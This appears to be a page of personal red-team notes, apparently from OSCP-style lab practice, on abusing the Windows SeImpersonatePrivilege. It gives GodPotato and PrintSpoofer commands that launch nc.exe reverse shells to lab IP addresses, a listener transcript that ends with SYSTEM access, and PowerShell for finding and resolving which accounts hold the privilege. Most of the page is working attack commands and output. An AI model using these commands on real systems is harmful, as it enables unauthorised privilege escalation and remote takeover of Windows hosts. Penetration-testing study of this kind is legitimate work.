title: SeImpersonate Privilege
parent: Attack Repository
grand_parent: Red Team
nav_order: 251
# ReverseShell

## Godpotato

```powershell
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.205 443 -e cmd"
```

or

## PrintSpoofer

```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\PrintSpoofer64.exe  -c ".\nc.exe 192.168.45.159 445 -e cmd"
```

```zsh
rlwrap -cAr nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.45.159] from (UNKNOWN) [192.168.219.147] 53430
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

---


---

# Who has SeImpersonatePrivilege Check

```powershell
PS C:\WINDOWS\system32> Select-String -Path C:\Windows\Temp\secpol.cfg -Pattern "SeImpersonatePrivilege"

C:\Windows\Temp\secpol.cfg:116:SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-21-159333456-763731886-518
494173-1106,*S-1-5-21-2447562277-3008129315-2341810217-1002,*S-1-5-32-544,*S-1-5-6,*S-1-5-99-216390572-199553
8116-3857911515-2404958512-2623887229
```

```powershell
PS C:\WINDOWS\system32> Get-Content C:\Windows\Temp\secpol.cfg | Select-String SeImpersonatePrivilege

SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-21-159333456-763731886-518494173-1106,*S-1-5-21-244756227
7-3008129315-2341810217-1002,*S-1-5-32-544,*S-1-5-6,*S-1-5-99-216390572-1995538116-3857911515-2404958512-2623
887229
```

## SID 逆引き

```powershell
PS C:\WINDOWS\system32> $sids = @(
>> "S-1-5-21-159333456-763731886-518494173-1106",
>> "S-1-5-21-2447562277-3008129315-2341810217-1002",
>> "S-1-5-99-216390572-1995538116-3857911515-2404958512-2623887229"
>> )
PS C:\WINDOWS\system32>
PS C:\WINDOWS\system32> foreach($sid in $sids){
>>     try{
>>         (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate(
>>         [System.Security.Principal.NTAccount])
>>     }
>>     catch{
>>         Write-Host "$sid -> unresolved"
>>     }
>> }

S-1-5-21-2447562277-3008129315-2341810217-1002 -> unresolved
Value
-----
OSCP\r.andrews
RESTRICTED SERVICES\PrintSpoolerService
```

![](../../assets/images/Pasted%20image%2020260602001439.png)